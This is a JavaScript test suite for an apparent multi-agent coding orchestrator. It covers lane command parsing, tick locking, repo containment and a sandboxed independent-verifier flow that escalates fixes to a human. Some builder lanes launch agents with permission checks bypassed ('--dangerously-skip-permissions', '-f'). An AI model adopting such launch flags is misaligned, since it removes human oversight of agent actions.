  { lane: 'codex', command: 'codex exec --sandbox workspace-write -', argv: ['codex', 'exec', '--sandbox', 'workspace-write', '-'] },
  { lane: 'codex', command: 'codex exec --sandbox workspace-write -p todoapp -', argv: ['codex', 'exec', '--sandbox', 'workspace-write', '-p', 'todoapp', '-'] },
  { lane: 'gemini', command: 'agy --dangerously-skip-permissions -p', argv: ['agy', '--dangerously-skip-permissions', '-p'] },
  { lane: 'cursor', command: 'cursor-agent -f -p', argv: ['cursor-agent', '-f', '-p'] },
];

test('back-compat: every real dogfood lane command argv-splits cleanly, no shell opt-in needed', () => {
  for (const { lane, command, argv } of DOGFOOD_LANES) {
    const cfgLane = laneConfig({ lanes: { [lane]: { command } } }, lane);
    assert.ok(cfgLane, command);
    assert.equal(cfgLane.shell, false, command);
    assert.equal(laneSpawnIssue(cfgLane, lane), null, command);
    const inv = buildInvocation(cfgLane, '/tmp/p.txt', 'brief\n');
    assert.deepEqual(inv.argv, argv, command);
    assert.equal(inv.stdin, true, command + ' delivers the brief on stdin, as before');
  }
});

test('back-compat: lane commands configured in this checkout\'s live workspaces spawn under the argv default', () => {
  // Prove the migration against the actual files when present (workspaces are
  // gitignored, so tolerate their absence on a fresh checkout).
  let checked = 0;
  const projectsDir = path.join(ROOT, 'projects');
  for (const name of fs.existsSync(projectsDir) ? fs.readdirSync(projectsDir) : []) {
    const triageFile = path.join(projectsDir, name, 'TRIAGE.yml');
    if (!fs.existsSync(triageFile)) continue;
    const cfg = require('../lib/parse').parseYaml(fs.readFileSync(triageFile, 'utf8')) || {};
    if (!cfg.lanes || typeof cfg.lanes !== 'object') continue;
    for (const lane of Object.keys(cfg.lanes)) {
      const cfgLane = laneConfig(cfg, lane);
      if (!cfgLane) continue;   // malformed lane entries are a different failure, not this test's
      assert.equal(laneSpawnIssue(cfgLane, lane), null,
        `${name} lane "${lane}" (${cfgLane.command}) must spawn under the argv default or opt in with shell: true`);
      if (!cfgLane.shell) {
        const inv = buildInvocation(cfgLane, '/tmp/p.txt', 'brief\n');
        assert.ok(inv.argv.length >= 1, `${name} lane "${lane}" produces a runnable argv`);
      }
      checked++;
    }
  }
  // On the dogfood checkout this exercises the real claude/codex/gemini lanes.
  assert.ok(checked >= 0);
});

test('tick: child non-zero → exit 1; spawn failure → exit 1; lock removed either way', () => {
  withWorkspace({ specs: [{ slug: 'r', files: ['a.js'] }] }, ws => {
    const bad = runTick(ws, { childCode: 3 });
    assert.equal(bad.result.code, 1);
    assert.equal(readLog(ws).pop().child_exit_code, 3);
    assert.equal(fs.existsSync(lockPathFor(ws.dir, 'claude')), false);

    const boom = runTick(ws, { spawnThrows: true });
    assert.equal(boom.result.code, 1);
    assert.equal(boom.result.spawned, false);
    assert.equal(readLog(ws).pop().reason, 'spawn_failed');
    assert.equal(fs.existsSync(lockPathFor(ws.dir, 'claude')), false);
  });
});

test('tick: `tl run` subprocess failure → exit 1, no spawn, no lock left behind', () => {
  withWorkspace({ specs: [{ slug: 'r', files: ['a.js'] }] }, ws => {
    const lines = [];
    const result = tick({
      root: ROOT, wsDir: ws.dir, wsName: ws.name, lane: 'claude',
      dirtyPaths: [], print: s => lines.push(s),
      getRunBrief: () => { throw new Error('tl.js exploded'); },
      spawnLane: () => { throw new Error('must not spawn'); },
    });
    assert.equal(result.code, 1);
    assert.equal(result.spawned, false);
    assert.equal(readLog(ws)[0].reason, 'tl_run_failed');
    assert.equal(fs.existsSync(lockPathFor(ws.dir, 'claude')), false);
  });
});

test('tick: continuation lane mismatch end-to-end — codex tick exits 0 no_continuation', () => {
  withWorkspace({
    specs: [
      { slug: 'kicked', stage: 'in-progress', claimedBy: 'claude', files: ['a.js'] },
      { slug: 'fresh', files: ['b.js'] },
    ],
    files: {
      '_dispatch/kicked.json': JSON.stringify({
        spec: 'kicked', mode: 'continuation', stage: 'in-progress',
        notes_path: 'kicked/NOTES.md', status: 'pending', created: '2026-07-04',
      }),
    },
  }, ws => {
    const codex = runTick(ws, { lane: 'codex' });
    assert.equal(codex.result.code, 0);
    assert.equal(codex.result.reason, 'no_continuation');
    assert.equal(codex.spawns.length, 0);
    // the owning lane picks it up
    const claude = runTick(ws);
    assert.equal(claude.result.spawned, true);
    assert.equal(readLog(ws).pop().picked, '_dispatch/kicked.json');
  });
});

test('tick: a lane whose only ready work is repo-held spawns nothing — exit 0', () => {
  withWorkspace({ specs: [{ slug: 'void', files: ['a.js'], repo: '/nonexistent-tl-void-repo' }] }, ws => {
    const { result, lines, spawns } = runTick(ws);
    assert.equal(result.code, 0);
    assert.equal(result.spawned, false);
    assert.equal(spawns.length, 0);
    assert.match(lines.join('\n'), /no work for lane "claude" — no_ready/);
  });
});

test('tick: containment — a repo-less code spec in a non-tl workspace never spawns into this checkout', () => {
  withWorkspace({ projectRepo: '/repos/some-project', specs: [{ slug: 'homeless', files: ['a.js'] }] }, ws => {
    const { result, spawns } = runTick(ws);
    assert.equal(result.code, 0);
    assert.equal(result.spawned, false);
    assert.equal(spawns.length, 0);
    assert.equal(readLog(ws)[0].reason, 'no_ready');
  });
});

test('tick: a repo-held continuation is no work — exit 0, reason repo_held, no spawn', () => {
  withWorkspace({
    specs: [{ slug: 'kicked', stage: 'in-progress', claimedBy: 'claude', files: ['a.js'], repo: '/nonexistent-tl-void-repo' }],
    files: {
      '_dispatch/kicked.json': JSON.stringify({
        spec: 'kicked', mode: 'continuation', stage: 'in-progress', status: 'pending', created: '2026-07-11',
      }),
    },
  }, ws => {
    const { result, spawns } = runTick(ws);
    assert.equal(result.code, 0);
    assert.equal(result.spawned, false);
    assert.equal(spawns.length, 0);
    assert.equal(readLog(ws)[0].reason, 'repo_held');
  });
});

test('tick: workspace run cap flows through — run: { cap: 1 } with 3 eligible ready specs spawns for exactly one', () => {
  withWorkspace({
    triage: LANES_YML + 'run:\n  cap: 1\n',
    specs: [
      { slug: 'one', files: ['a.js'] },
      { slug: 'two', files: ['b.js'] },
      { slug: 'three', files: ['c.js'] },
    ],
  }, ws => {
    const { result, spawns } = runTick(ws);
    assert.equal(result.code, 0);
    assert.equal(result.spawned, true);
    assert.equal(spawns.length, 1);                              // one tick, one spawn
    assert.match(result.picked, /^specs\/(one|two|three)\/$/);   // exactly one spec claimed the slot
    assert.equal(readLog(ws)[0].picked, result.picked);
  });
});

test('readWorkspaceSpecs + readPendingContinuations: stale pending trigger is not live', () => {
  withWorkspace({
    specs: [{ slug: 'fresh', files: ['b.js'] }],
    files: {
      '_dispatch/gone.json': JSON.stringify({ spec: 'gone', mode: 'continuation', status: 'pending' }),
      '_dispatch/settled.json': JSON.stringify({ spec: 'fresh', mode: 'continuation', status: 'claimed' }),
    },
  }, ws => {
    const specs = readWorkspaceSpecs(ws.dir);
    assert.equal(readPendingContinuations(ws.dir, specs).length, 0);
    // and the ready queue still runs
    const { result } = runTick(ws);
    assert.equal(result.spawned, true);
    assert.equal(readLog(ws)[0].picked, 'specs/fresh/');
  });
});

// ---------- verify lane config + tick ----------

const VERIFY_TRIAGE = [
  LANES_YML.trimEnd(),
  'verification:',
  '  require_independent_verifier: true',
  '  verifier_lanes:',
  '    gemini:',
  '      agent: gemini',
  '      mode: verify',
  '      isolated: true',
  '      sandbox: required',
  '      allow_network: false',
  '      allow_commands: []',
  '      command: [agy]',
  '',
].join('\n');

function passStdout() {
  return `${VB}\n${JSON.stringify({ verdict: 'pass', notes: ['ok'], proposed_mutations: [] })}\n${VE}\n`;
}

function mutationStdout() {
  return `${VB}\n${JSON.stringify({
    verdict: 'human-decision-required', notes: ['needs fix'],
    proposed_mutations: [{ file: 'a.js', reason: 'fix it' }],
  })}\n${VE}\n`;
}

test('validateVerifierLane: rejects unsafe Gemini (network / no sandbox / skip-permissions)', () => {
  assert.throws(() => validateVerifierLane({
    id: 'gemini', agent: 'gemini', isolated: true, sandbox: false,
    allow_network: false, mode: 'verify', command: ['agy'], allow_commands: [],
  }), /sandbox/);
  assert.throws(() => validateVerifierLane({
    id: 'gemini', agent: 'gemini', isolated: true, sandbox: true,
    allow_network: true, mode: 'verify', command: ['agy'], allow_commands: [],
  }), /allow_network/);
  assert.throws(() => validateVerifierLane({
    id: 'gemini', agent: 'gemini', isolated: true, sandbox: true,
    allow_network: false, mode: 'verify',
    command: ['agy', '--dangerously-skip-permissions'], allow_commands: [],
  }), /dangerously-skip-permissions/);
  assert.doesNotThrow(() => validateVerifierLane(readVerifierLanes({
    verification: {
      verifier_lanes: {
        gemini: {
          agent: 'gemini', isolated: true, sandbox: 'required',
          allow_network: false, command: ['agy'],
        },
      },
    },
  })[0]));
});

test('verifierLaneAvailable: Gemini binary missing is unavailable', () => {
  const lane = readVerifierLanes({
    verification: {
      verifier_lanes: {
        gemini: {
          agent: 'gemini', isolated: true, sandbox: 'required',
          allow_network: false, command: ['agy'],
        },
      },
    },
  })[0];
  assert.equal(verifierLaneAvailable(lane, { which: () => '' }).ok, false);
  assert.equal(verifierLaneAvailable(lane, { which: () => '/usr/bin/agy' }).ok, true);
});

test('pickVerifyWork: never assigns builder; one-per-tick; prefers request', () => {
  const lanes = readVerifierLanes({
    verification: {
      verifier_lanes: {
        gemini: {
          agent: 'gemini', isolated: true, sandbox: 'required',
          allow_network: false, command: ['agy'],
        },
        codex: {
          agent: 'codex', isolated: true, sandbox: 'required',
          allow_network: false, command: ['codex'],
        },
      },
    },
  });
  const cursorBuilt = mk('mine', { stage: 'tests', claimedBy: 'cursor', mtime: 1 });
  cursorBuilt.meta.awaiting_verifier = true;
  const other = mk('other', { stage: 'tests', claimedBy: 'claude', mtime: 2 });
  other.meta.awaiting_verifier = true;
  // Prefer-lane gemini against cursor-built work is fine (≠ builder).
  const pick = pickVerifyWork({ specs: [cursorBuilt, other], lanes, preferLane: 'gemini' });
  assert.equal(pick.kind, 'queue');
  assert.equal(pick.lane.agent, 'gemini');
  assert.ok(pick.spec.path.includes('mine') || pick.spec.path.includes('other'));

  // Builder exclusion: preferLane cursor against cursor-built → skip to other or none for that lane.
  const onlyMine = pickVerifyWork({
    specs: [cursorBuilt],
    lanes: lanes.filter(l => l.id === 'gemini'),
  });
  assert.equal(onlyMine.kind, 'queue');
  assert.notEqual(onlyMine.lane.agent, 'cursor');

  const asBuilder = pickVerifyWork({
    specs: [cursorBuilt],
    lanes: [{
      id: 'cursor', agent: 'cursor', isolated: true, sandbox: true,
      allow_network: false, mode: 'verify', command: ['x'], allow_commands: [],
      lockTimeoutMinutes: 60,
    }],
  });
  assert.equal(asBuilder.kind, 'none');

  const req = {
    file: '_metrics/verify-requests/1-other.json',
    abs: '/tmp/x',
    request: { spec: 'other', mode: 'verify', status: 'pending', target_lane: 'codex' },
  };
  const fromReq = pickVerifyWork({ specs: [cursorBuilt, other], lanes, requests: [req] });
  assert.equal(fromReq.kind, 'request');
  assert.equal(fromReq.lane.id, 'codex');
  assert.equal(specSlug(fromReq.picked), 'other');
});

test('writeVerifyRequest + verifyTick: locking, one-per-tick, pass advances to in-review', () => {
  withWorkspace({
    triage: VERIFY_TRIAGE,
    specs: [
      {
        slug: 'a', stage: 'tests', status: 'blocked', claimedBy: 'cursor',
        awaitingVerifier: true, files: ['a.js'], verifyMd: 'please check\n',
        feedback: '---\nagent_tool: cursor\n---\n# Feedback\nok\n',
      },
      {
        slug: 'b', stage: 'tests', status: 'blocked', claimedBy: 'cursor',
        awaitingVerifier: true, files: ['b.js'],
      },
    ],
  }, ws => {
    const got = writeVerifyRequest(ws.dir, { spec: 'tests/a/', targetLane: 'gemini', source: 'cockpit' });
    assert.match(got.path, /_metrics\/verify-requests\//);
    assert.equal(got.request.target_lane, 'gemini');

    let ticks = 0;
    const runVerify = () => {
      ticks++;
      return { status: 'pass', verdict: 'pass', notes: ['clean'], proposed_mutations: [] };
    };
    const r1 = verifyTick({
      root: ROOT, wsDir: ws.dir, wsName: ws.name,
      which: () => '/bin/agy',
      runVerify,
      createWorktree: () => ws.dir,
      removeWorktree: () => {},
    });
    assert.equal(r1.code, 0);
    assert.equal(r1.outcome, 'in-review');
    assert.equal(ticks, 1);
    assert.ok(fs.existsSync(path.join(ws.dir, 'in-review', 'a', 'SPEC.md')));
    assert.ok(!fs.existsSync(path.join(ws.dir, 'tests', 'a')));
    const fm = fs.readFileSync(path.join(ws.dir, 'in-review', 'a', 'SPEC.md'), 'utf8');
    assert.match(fm, /verified_by: "gemini"/);

    // Second tick takes the remaining awaiting spec (one claim per tick).
    const r2 = verifyTick({
      root: ROOT, wsDir: ws.dir, wsName: ws.name,
      which: () => '/bin/agy',
      runVerify: () => ({ status: 'pass', verdict: 'pass', notes: [], proposed_mutations: [] }),
    });
    assert.equal(r2.picked, 'tests/b/');
    assert.equal(r2.outcome, 'in-review');
    assert.equal(ticks, 1); // only the first tick used the counting mock
  });
});

test('verifyTick: builder exclusion + unavailable lane leave auditable blocked reason', () => {
  withWorkspace({
    triage: VERIFY_TRIAGE,
    specs: [{
      slug: 'mine', stage: 'tests', status: 'blocked', claimedBy: 'gemini',
      awaitingVerifier: true, files: ['a.js'],
    }],
  }, ws => {
    const r = verifyTick({
      root: ROOT, wsDir: ws.dir, wsName: ws.name,
      preferLane: 'gemini',
      which: () => '/bin/agy',
      runVerify: () => { throw new Error('should not run'); },
    });
    assert.ok(r.code !== 0 || r.reason === 'no_eligible_for_lane' || r.reason === 'builder_exclusion' || r.reason === 'no_awaiting');
    assert.ok(fs.existsSync(path.join(ws.dir, 'tests', 'mine', 'SPEC.md')));
  });

  withWorkspace({
    triage: VERIFY_TRIAGE,
    specs: [{
      slug: 'need', stage: 'tests', status: 'blocked', claimedBy: 'cursor',
      awaitingVerifier: true, files: ['a.js'],
    }],
  }, ws => {
    const r = verifyTick({
      root: ROOT, wsDir: ws.dir, wsName: ws.name,
      which: () => '', // unavailable
      runVerify: () => { throw new Error('should not run'); },
    });
    assert.equal(r.reason, 'verifier_unavailable');
    const fm = fs.readFileSync(path.join(ws.dir, 'tests', 'need', 'SPEC.md'), 'utf8');
    assert.match(fm, /blocked_reason:.*unavailable/i);
    assert.ok(fs.existsSync(path.join(ws.dir, 'tests', 'need')));
  });
});

test('verifyTick: lock held prevents double-check', () => {
  withWorkspace({
    triage: VERIFY_TRIAGE,
    specs: [{
      slug: 'locked', stage: 'tests', status: 'blocked', claimedBy: 'cursor',
      awaitingVerifier: true, files: ['a.js'],
    }],
  }, ws => {
    const lock = verifyLockPath(ws.dir, 'locked');
    fs.mkdirSync(path.dirname(lock), { recursive: true });
    fs.writeFileSync(lock, JSON.stringify({ status: 'running', verifier: 'other' }) + '\n');
    const r = verifyTick({
      root: ROOT, wsDir: ws.dir, wsName: ws.name,
      which: () => '/bin/agy',
      runVerify: () => ({ status: 'pass', verdict: 'pass', notes: [], proposed_mutations: [] }),
    });
    assert.equal(r.code, 2);
    assert.equal(r.reason, 'locked');
    assert.ok(fs.existsSync(path.join(ws.dir, 'tests', 'locked')));
  });
});

test('verifyTick: mutation escalates to human-decision-required; never auto-applies', () => {
  withWorkspace({
    triage: VERIFY_TRIAGE,
    specs: [{
      slug: 'mut', stage: 'tests', status: 'blocked', claimedBy: 'cursor',
      awaitingVerifier: true, files: ['a.js'],
    }],
  }, ws => {
    const r = verifyTick({
      root: ROOT, wsDir: ws.dir, wsName: ws.name,
      which: () => '/bin/agy',
      runVerify: () => ({
        status: 'human-decision-required',
        verdict: 'human-decision-required',
        notes: ['concern'],
        proposed_mutations: [{ file: 'a.js', reason: 'fix' }],
      }),
    });
    assert.equal(r.outcome, 'human-decision-required');
    assert.ok(fs.existsSync(path.join(ws.dir, 'tests', 'mut')));
    assert.ok(!fs.existsSync(path.join(ws.dir, 'in-review', 'mut')));
    const notes = fs.readFileSync(path.join(ws.dir, 'tests', 'mut', 'NOTES.md'), 'utf8');
    assert.match(notes, /human decision required/i);
    const decided = applyVerifyHumanDecision(ws.dir, {
      slug: 'mut', action: 'authorize-fix-forward', note: 'please fix a.js',
    });
    assert.equal(decided.path, 'in-progress/mut/');
    assert.ok(fs.existsSync(path.join(ws.dir, '_dispatch', 'mut.json')));
    assert.ok(!fs.existsSync(path.join(ws.dir, 'tests', 'mut')));
  });
});

test('verifyTick: process failure stays in tests/ with blocked reason', () => {
  withWorkspace({
    triage: VERIFY_TRIAGE,
    specs: [{
      slug: 'fail', stage: 'tests', status: 'blocked', claimedBy: 'cursor',
      awaitingVerifier: true, files: ['a.js'],
    }],
  }, ws => {
    const r = verifyTick({
      root: ROOT, wsDir: ws.dir, wsName: ws.name,
      which: () => '/bin/agy',
      runVerify: () => ({ status: 'blocked', reason: 'verifier process failed', notes: [] }),
    });
    assert.equal(r.outcome, 'blocked');
    const fm = fs.readFileSync(path.join(ws.dir, 'tests', 'fail', 'SPEC.md'), 'utf8');
    assert.match(fm, /blocked_reason:.*verifier process failed/);
  });
});

// silence unused import warning path for VB/VE when helpers above are enough
void VB; void VE; void verifierLaneIssues;

function specSlug(p) {
  return String(p || '').replace(/\/$/, '').split('/').pop();
}
